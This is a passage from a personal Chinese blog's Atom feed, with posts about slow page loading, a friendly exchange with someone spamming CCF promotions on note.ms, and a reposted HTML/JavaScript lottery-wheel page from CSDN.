<h1 id="多媒体">多媒体</h1>
<p>到现在我也不会更改多媒体上的系统时间，导致我们班不能像他们班一样看b站。<br>
5555</p>
<h1 id="感">感</h1>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=349981&auto=0&height=66"></iframe>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[加载缓慢的问题]]></title>
        <id>https://strangepapers.github.io/post/jia-zai-huan-man-de-wen-ti/</id>
        <link href="https://strangepapers.github.io/post/jia-zai-huan-man-de-wen-ti/">
        </link>
        <updated>2023-02-01T01:18:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="在访问的时候加载总是很慢为什么">在访问的时候，加载总是很慢，为什么？</h1>
<p>1  github<br>
github的网页加载的确很慢，这并没有办法。<br>
以后会考虑换址。</p>
<p>2 字体文件<br>
在此页面，我配置了字体文件。<br>
很美观，但加载时间会出奇的慢。<br>
字体文件是放在最后传输的，您也可以在配置未完成的时候进行浏览。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[翻身]]></title>
        <id>https://strangepapers.github.io/post/fan-shen/</id>
        <link href="https://strangepapers.github.io/post/fan-shen/">
        </link>
        <updated>2023-01-31T14:51:01.000Z</updated>
        <summary type="html"><![CDATA[<p>在note.ms闲逛，发现有人用脚本刷CCF来捣乱。<br>
<strong>这不能忍</strong></p>
<blockquote>
<p>CCF，以推动计算技术领域学术，技术，教育，应用和产业的发展，助力计算技术领域专业人士能力提升为使命，目前拥有超过10万名付费个人会员。</p>
</blockquote>
<blockquote>
<p>CCF，下设城市会员活动中心，学生分会，YOCSEF城市论坛，以及大数据，自然语言处理，和高性能计算等专业委员会。共近两百个会员服务机构，每年举办近千场专业活动，服务网络遍布全国。</p>
</blockquote>
<blockquote>
<p>CNCC，年度计算技术盛会，每年数千人参会，已举办17届。</p>
</blockquote>
<p>等等。</p>
<p>于是，我用最和平的方式结束了这场坚持4个小时的战役。</p>
]]></summary>
        <content type="html"><![CDATA[<p>在note.ms闲逛，发现有人用脚本刷CCF来捣乱。<br>
<strong>这不能忍</strong></p>
<blockquote>
<p>CCF，以推动计算技术领域学术，技术，教育，应用和产业的发展，助力计算技术领域专业人士能力提升为使命，目前拥有超过10万名付费个人会员。</p>
</blockquote>
<blockquote>
<p>CCF，下设城市会员活动中心，学生分会，YOCSEF城市论坛，以及大数据，自然语言处理，和高性能计算等专业委员会。共近两百个会员服务机构，每年举办近千场专业活动，服务网络遍布全国。</p>
</blockquote>
<blockquote>
<p>CNCC，年度计算技术盛会，每年数千人参会，已举办17届。</p>
</blockquote>
<p>等等。</p>
<p>于是，我用最和平的方式结束了这场坚持4个小时的战役。</p>
<!-- more -->
<p>和平且富有礼貌。</p>
<blockquote>
<p>临时留言<br>
您好。<br>
发r的谁<br>
我。有问题？</p>
</blockquote>
<blockquote>
<p>你手动还是脚本？？？？？我暂时挂一个200ms的脚本</p>
</blockquote>
<blockquote>
<p>您是谁？</p>
</blockquote>
<blockquote>
<p>宣传CCF，拜月教</p>
</blockquote>
<blockquote>
<p>您为什么要在这里宣传？<br>
我们存在的意义是为大家创造一个稳定的交流空间。您的行为也许不利于发展。<br>
或许我们可以好好谈一谈。</p>
</blockquote>
<blockquote>
<p>你是Dentist Pamphlet</p>
</blockquote>
<blockquote>
<p>是。<br>
我很欣赏您的能力，您有意加入我们吗？<br>
相信您的才华与能力要比我见识的多</p>
</blockquote>
<blockquote>
<p>我是OIer，现在没时间了</p>
</blockquote>
<blockquote>
<p>哈哈，您有时间宣传，怎么会没时间？您真会开玩笑。<br>
我们不需要您太多的时间和精力。</p>
</blockquote>
<blockquote>
<p>脚本我是挂在我自己服务器上的，偶尔看一下，不需要怎么手动操控。</p>
</blockquote>
<blockquote>
<p>那很好。我还是诚挚的邀请你加入，不过您不加入也没有关系。<br>
宣传嘛，您可以选择换一个地方，您说怎么样？</p>
</blockquote>
<blockquote>
<p>/chat以后可以不维护了，但是我不会加入的。我现在要停止颓废了，就说这么多。</p>
</blockquote>
<blockquote>
<p>好的。与您交流真是胜读十年书。我们尊重您的意见，再见。</p>
</blockquote>
<p>真是文明的我。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HTML转盘]]></title>
        <id>https://strangepapers.github.io/post/html-zhuan-pan/</id>
        <link href="https://strangepapers.github.io/post/html-zhuan-pan/">
        </link>
        <updated>2023-01-30T10:59:31.000Z</updated>
        <summary type="html"><![CDATA[<p>在csdn看到的<br>
回头整个低配版拼多多哈哈哈哈哈</p>
]]></summary>
        <content type="html"><![CDATA[<p>在csdn看到的<br>
回头整个低配版拼多多哈哈哈哈哈</p>
<!-- more -->
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;抽奖&lt;/title&gt;
    &lt;style&gt;
        * {
            margin: 0;
            padding: 0;
        }
        body {
            font-family: &quot;Microsoft YaHei&quot;,微软雅黑;
        }
        .box{
            width:600px;
            height:600px;
            background-color: #ff9615;
            padding: 20px;
            border-radius: 50%;
            border:2px solid #ffd50e;
            position:relative;
            margin: 100px auto;
        }
        .turntable{
            width:600px;
            height:600px;
            background-color: red;
            border-radius: 50%;
            position:relative;
            box-shadow: 0 0 10px #000;
            line-height:95px;
        }
        .little-circle{
            width:10px;
            height:10px;
            border-radius:50%;
            border:1px solid black;
            position:absolute;
            left:50%;
            margin-left: -5px;
            margin-top: 5px;
 
        }
        .little-circle:nth-child(even) {
            background-color: #f1c96c;
        }
        .little-circle:nth-child(odd) {
            background-color: #fff6db;
        }
        .prize-zone{
            width:556px;
            height: 556px;
            border-radius:50%;
            position:absolute;
 
            left: 50%;
            margin-left: -278px;
            top:50%;
            margin-top: -278px;
            overflow: hidden;
        }
        .prize{
            width:278px;
            height:278px;
            position:absolute;
            left:0;
            top:0;
        }
        .prize:nth-child(odd) {
            background-color: #f1c96c;
        }
        .prize:nth-child(even) {
            background-color: #fff6db;
        }
        .btn{
            width:100px;
            height:100px;
            border-radius:50%;
            position:absolute;
            left:50%;
            margin-left:-50px;
            top:50%;
            margin-top:-50px;
            background-color: #ff7609;
            color:white;
            font-size: 30px;
            font-weight: bolder;
            text-align: center;
            vertical-align: middle;
            cursor:pointer;
        }
        .pointer{
            width:0;
            height:0;
            position: absolute;
            left:50%;
            margin-left: -25px;
            top:50%;
            margin-top: -100px;
            border-bottom: 100px solid #ff9615;
            border-left:25px solid transparent;
            border-right:25px solid transparent;
        }
        .content{
            width:200px;
            height:250px;
            position:absolute;
            right:0;
            bottom:0;
            text-align: center;
        }
        .content .thanks{
            width:34px;
            height: 150px;
            font-size:30px;
            font-weight: bolder;
            color: #ff6e37;
            margin:0 auto;
            line-height: 34px;
            padding-top:20px;
        }
        .content .img{
            width:10px;
            height:10px;
            position: absolute;
            left:50%;
            margin-left:-40px;
            top:5%;
        }
        .content img{
            width:80px;
            height:100px;
            position: absolute;
        }
        .txt{
            width: 100px;
            height: 50px;
            font-size: 20px;
            line-height: 32px;
            margin: 0 auto;
            padding-top:120px;
            color: #ff6e37;
            font-weight: bolder;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class=&quot;box&quot;&gt;
    &lt;div class=&quot;turntable&quot;&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;little-circle&quot;&gt;&lt;/div&gt;
 
        &lt;div class=&quot;prize-zone&quot;&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;thanks&quot;&gt;谢谢参与&lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;img&quot;&gt;
                        &lt;img src=&quot;prize/router.jpg&quot; /&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;txt&quot;&gt;
                        &lt;p&gt;四等奖&lt;/p&gt;
                        &lt;p&gt;路由器&lt;/p&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;thanks&quot;&gt;谢谢参与&lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;img&quot;&gt;
                        &lt;img src=&quot;prize/bicycle.jpg&quot; /&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;txt&quot;&gt;
                        &lt;p&gt;一等奖&lt;/p&gt;
                        &lt;p&gt;自行车&lt;/p&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;thanks&quot;&gt;谢谢参与&lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;img&quot;&gt;
                        &lt;img src=&quot;prize/glass.jpg&quot; /&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;txt&quot;&gt;
                        &lt;p&gt;二等奖&lt;/p&gt;
                        &lt;p&gt;3D眼睛&lt;/p&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;thanks&quot;&gt;谢谢参与&lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class=&quot;prize&quot;&gt;
                &lt;div class=&quot;content&quot;&gt;
                    &lt;div class=&quot;img&quot;&gt;
                        &lt;img src=&quot;prize/kindle.jpg&quot; /&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;txt&quot;&gt;
                        &lt;p&gt;三等奖&lt;/p&gt;
                        &lt;p&gt;kindle&lt;/p&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;div class=&quot;pointer&quot;&gt;&lt;/div&gt;
        &lt;div id=&quot;btn&quot; class=&quot;btn&quot;&gt;抽奖&lt;/div&gt;
    &lt;/div&gt;
 
&lt;/div&gt;
&lt;script&gt;
    // 小圆圈的旋转变换
    let circleList = document.querySelectorAll('.little-circle');
    let len = circleList.length;
    let rotateStep = 360/len;
    let halfOfRotateStep = rotateStep/2;
    circleList.forEach(function(item,index){
        let deg = rotateStep*index+halfOfRotateStep;
        item.style.transform=&quot;rotate(&quot;+deg+&quot;deg)&quot;;
        item.style.transformOrigin=&quot;5px 295px&quot;;
    });
    // 每一个奖品的变换
    let prizeList = document.querySelectorAll('.prize');
    let pLen = prizeList.length;
    let pRotateStep = 360/pLen;
    let halfOfPRotateStep = pRotateStep/2;
    prizeList.forEach(function(item,index){
        item.style.transform=&quot;rotate(&quot;+(pRotateStep*index)+&quot;deg&quot;+&quot;) skewY(&quot;+pRotateStep+&quot;deg)&quot;;
        item.style.transformOrigin=&quot;right bottom&quot;;
    });
    // 奖品的内容变换
    let contentList = document.querySelectorAll('.content');
    contentList.forEach(function(item){
        // 反向变换，用于抵消div.prize的变形 这里的translate值，其实可以用三角函数算出来，但是太复杂，我就用肉眼观测取了7px 100px这么个值
        item.style.transform = &quot;skewY(-&quot;+pRotateStep+&quot;deg) rotate(-&quot;+halfOfPRotateStep+&quot;deg) translate(7px, 100px)&quot;;
        item.style.transformOrigin = &quot;center center&quot;;
    });
    let retry = false;
    // 抽奖按钮的点击事件
    document.querySelector('#btn').onclick=function(){
        if(retry){
            retry=false;
            clear();
            document.querySelector('#btn').innerText=&quot;抽奖&quot;;
            return;
        }
        // 计算一个随机的度数，转起来，先转上十圈然后再转一圈内的随机度数
        document.querySelector('#btn').style.cursor=&quot;wait&quot;;
 
        let deg1=360*10;
        let deg2 = (Math.floor(Math.random()*8)+1)*45+22.5;
        let deg=deg1+deg2;
        console.log(deg);
        let truntable = document.querySelector('.prize-zone');
        truntable.style.transition=&quot;all 10s ease&quot;;
        truntable.style.transform=&quot;rotate(&quot;+deg+&quot;deg)&quot;;
    };
    // 监听动画完成事件
    document.querySelector('.prize-zone').addEventListener('transitionend',function(){
        document.querySelector('#btn').style.cursor=&quot;pointer&quot;;
        retry=true;
        document.querySelector('#btn').innerText=&quot;重置&quot;;
    });
    function clear(){
        let truntable = document.querySelector('.prize-zone');
        truntable.style.transition=&quot;none&quot;;
        truntable.style.transform=&quot;none&quot;;
    }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>取自CSDN<br>
<img src="https://i.328888.xyz/2023/01/30/8t3zc.png" alt="8t3zc.png" loading="lazy"></p>
]]></content>
    </entry>
</feed>